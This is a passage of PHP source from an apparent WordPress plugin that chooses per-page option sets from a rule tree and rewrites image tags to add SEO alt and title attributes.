				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_tax() ) {
			$term = get_queried_object();
			$cur_taxonomy_id = $term->term_id;
			$found = false;
			$found_group = null;
			foreach ( $this->tree["archive"]["taxonomy"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_taxonomy_id, $group["ids"] );
					if ( in_array( $cur_taxonomy_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["archive"]["taxonomy"][$found_group]["options"];
			} elseif ( $this->tree["archive"]["taxonomy"]["options"] != null ) {
				$options = $this->tree["archive"]["taxonomy"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_author() ) {
			$term = get_queried_object();
			$cur_author_id = $term->ID;
			$found = false;
			$found_group = null;
			foreach ( $this->tree["archive"]["author"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_author_id, $group["ids"] );
					if ( in_array( $cur_author_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["archive"]["author"][$found_group]["options"];
			} elseif ( $this->tree["archive"]["author"]["options"] != null ) {
				$options = $this->tree["archive"]["author"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_year() ) {
			if ( $this->tree["archive"]["date"]["year"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["year"]["options"];
			} elseif ( $this->tree["archive"]["date"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_month() ) {
			if ( $this->tree["archive"]["date"]["month"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["month"]["options"];
			} elseif ( $this->tree["archive"]["date"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_day() ) {
			if ( $this->tree["archive"]["date"]["day"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["day"]["options"];
			} elseif ( $this->tree["archive"]["date"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_time() ) {
			if ( $this->tree["archive"]["date"]["time"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["time"]["options"];
			} elseif ( $this->tree["archive"]["date"]["options"] != null ) {
				$options = $this->tree["archive"]["date"]["options"];
			} elseif ( $this->tree["archive"]["options"] != null ) {
				$options = $this->tree["archive"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_attachment() ) {
			global $post;
			$cur_attachment_id = $post->ID;
			$found = false;
			$found_group = null;
			foreach ( $this->tree["singular"]["attachment"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_attachment_id, $group["ids"] );
					if ( in_array( $cur_attachment_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["singular"]["attachment"][$found_group]["options"];
			} elseif ( $this->tree["singular"]["attachment"]["options"] != null ) {
				$options = $this->tree["singular"]["attachment"]["options"];
			} elseif ( $this->tree["singular"]["options"] != null ) {
				$options = $this->tree["singular"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		} elseif ( is_page() ) {
			global $post;
			$cur_page_id = $post->ID;
			$found = false;
			$found_group = null;
			foreach ( $this->tree["singular"]["page"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_page_id, $group["ids"] );
					if ( in_array( $cur_page_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["singular"]["page"][$found_group]["options"];
			} elseif ( $this->tree["singular"]["page"]["options"] != null ) {
				$options = $this->tree["singular"]["page"]["options"];
			} elseif ( $this->tree["singular"]["options"] != null ) {
				$options = $this->tree["singular"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		}
		elseif ( is_single() ) {
			global $post;
			$cur_post_id = $post->ID;
			$found = false;
			$found_group = null;
			foreach ( $this->tree["singular"]["post"] as $key => $group ) {
				if ( $key != 'options' ) {
					$found = $found || in_array( $cur_post_id, $group["ids"] );
					if ( in_array( $cur_post_id, $group["ids"] ) ) {
						$found_group = $key;
					}
				}
			}
			if ( $found ) {
				$options = $this->tree["singular"]["post"][$found_group]["options"];
			} elseif ( $this->tree["singular"]["post"]["options"] != null ) {
				$options = $this->tree["singular"]["post"]["options"];
			} elseif ( $this->tree["singular"]["options"] != null ) {
				$options = $this->tree["singular"]["options"];
			} else {
				$options = $this->tree["all"]["options"];
			}
		}
		
		return $options;
	}
	
	function seo_friendly_images( $content ) {
		$options = $this->get_proper_options();
		
		if ( $options["enable"] == 'on' ) {
			$this->process_parameters['alt'] = $options['alt'];
			$this->process_parameters['title'] = $options['title'];
			$this->process_parameters['override_alt'] = $options['override_alt'];
			$this->process_parameters['override_title'] = $options['override_title'];
			$this->process_parameters['strip_extension_title'] = $options['strip_extension_title'];
			$replaced = preg_replace_callback( '/<img[^>]+/', array( $this, 'seo_friendly_images_process' ), $content, 20 );
			
			return $replaced;
		}
		
		return $content;
	}
	
	function seo_friendly_images_featured( $html ) {
		$options = $this->get_proper_options();
		
		if ( $options["enable"] == 'on' ) {
			$this->process_parameters['alt'] = $options['alt'];
			$this->process_parameters['title'] = $options['title'];
			$this->process_parameters['override_alt'] = $options['override_alt'];
			$this->process_parameters['override_title'] = $options['override_title'];
			$this->process_parameters['strip_extension_title'] = $options['strip_extension_title'];
			$replaced = preg_replace_callback( '/<img[^>]+/', array( $this, 'seo_friendly_images_process' ), $html );
			return $replaced;
		}
		
		return $html;
	}
	

	
	//this function removes 640x480 like dimension information from image URLs which is added by wordpress when generating multiple images for the uploaded one 
	function fix_img_url( $url ) {
		$url = preg_replace( '/-([0-9]{1,5})x([0-9]{1,5})\./i', '.', $url );
		return $url;
	}
	

	
	
	function build_tree() {
		$this->tree["all"]["options"] = null;
		$this->tree["main"]["options"] = null;
		$this->tree["main"]["home"]["options"] = null;
		$this->tree["main"]["front"]["options"] = null;
		$this->tree["archive"]["options"] = null;
		$this->tree["archive"]["category"]["options"] = null;
		$this->tree["archive"]["tag"]["options"] = null;
		$this->tree["archive"]["taxonomy"]["options"] = null;
		$this->tree["archive"]["author"]["options"] = null;
		$this->tree["archive"]["date"]["options"] = null;
		$this->tree["archive"]["date"]["year"]["options"] = null;
		$this->tree["archive"]["date"]["month"]["options"] = null;
		$this->tree["archive"]["date"]["day"]["options"] = null;
		$this->tree["archive"]["date"]["time"]["options"] = null;
		$this->tree["archive"]["search"]["options"] = null;
		$this->tree["singular"]["options"] = null;
		$this->tree["singular"]["post"]["options"] = null;
		$this->tree["singular"]["page"]["options"] = null;
		$this->tree["singular"]["attachment"]["options"] = null;			 
		if (isset($this->rules))
		foreach( $this->rules as $rule ) {
			if ( isset( $rule["domains"] ) && is_array( $rule["domains"] ) )
				foreach( $rule["domains"] as $key => $domain ) {
					if( ! is_int( $key ) ) {
						switch( $key ) {
						case "category":
							$num = count( $this->tree["archive"]["category"] );
							$this->tree["archive"]["category"]["group_" . $num]["ids"] = $domain;
							$this->tree["archive"]["category"]["group_" . $num]["options"] = $rule["options"];
							break;
						case "tag":
							$num = count( $this->tree["archive"]["tag"] );
							$this->tree["archive"]["tag"]["group_" . $num]["ids"] = $domain;
							$this->tree["archive"]["tag"]["group_" . $num]["options"] = $rule["options"];
							break;
						case "taxonomy":
							$num = count( $this->tree["archive"]["taxonomy"] );
							$this->tree["archive"]["taxonomy"]["group_" . $num]["ids"] = $domain;
							$this->tree["archive"]["taxonomy"]["group_" . $num]["options"] = $rule["options"];
							break;
						case "author":
							$num = count( $this->tree["archive"]["author"] );
							$this->tree["archive"]["author"]["group_" . $num]["ids"] = $domain;
							$this->tree["archive"]["author"]["group_" . $num]["options"] = $rule["options"];
	
							break;
						case "post":
							$num = count( $this->tree["singular"]["post"] );
							$this->tree["singular"]["post"]["group_" . $num]["ids"] = $domain;
							$this->tree["singular"]["post"]["group_" . $num]["options"] = $rule["options"];
							break;
						case "page":
							$num = count( $this->tree["singular"]["page"] );
							$this->tree["singular"]["page"]["group_" . $num]["ids"] = $domain;
							$this->tree["singular"]["page"]["group_" . $num]["options"] = $rule["options"];
							break;
						case "attachment":
							$num = count( $this->tree["singular"]["attachment"] );
							$this->tree["singular"]["attachment"]["group_" . $num]["ids"] = $domain;
							$this->tree["singular"]["attachment"]["group_" . $num]["options"] = $rule["options"];
							break;
						}
					} else {
						switch( $domain )
						{
						case "all":
						case "main":
						case "archive":
						case "singular":
							if( $this->tree[$domain]["options"] == null )
							{
								$this->tree[$domain]["options"] = $rule["options"];
							}
							break;
						case "home":
						case "front":
							if( $this->tree["main"][$domain]["options"] == null )
							{
								$this->tree["main"][$domain]["options"] = $rule["options"];
							}
							break;
						case "category":
						case "tag":
						case "taxonomy":
						case "author":
						case "date":
						case "search":
							if( $this->tree["archive"][$domain]["options"] == null )
							{
								$this->tree["archive"][$domain]["options"] = $rule["options"];
							}
							break;
						case "year":
						case "month":
						case "day":
						case "time":
							if( $this->tree["archive"]["date"][$domain]["options"] == null )
							{
								$this->tree["archive"]["date"][$domain]["options"] = $rule["options"];
							}
							break;
						case "post":
						case "page":
						case "attachment":
							if( $this->tree["singular"][$domain]["options"] == null ) {
								$this->tree["singular"][$domain]["options"] = $rule["options"];
							}
							break;
						}
					}
				}
		}
	}
	
	function get_options() {
		$options = array(
			
			'rules' => array(
				0 => array(
					'domains' => array(
						'all'
					),
					'options' => array(
						'alt' => '%name %title',
						'title' => '%name photo',
						'override_alt' => 'on',
						'override_title' => 'off',
						'strip_extension_title' => 'on',
						
						'attach_internal_images' => 'def',
						
						'attach_external_images' => 'def',
					
						'external_links' => 'on',
						'enable' => true
					)
				)
			),
		
		);
		
		$saved = get_option( $this->key );
		
		if (!empty($saved)) {
			foreach ($options['rules'] as $key => $option)
				if (!isset($saved['rules'][$key]))
					$saved['rules'][$key] = $option;
		}
		
		if ( $saved != $options ) {
			update_option( $this->key, $saved );
		}
		
		return $saved;
	}
}
?>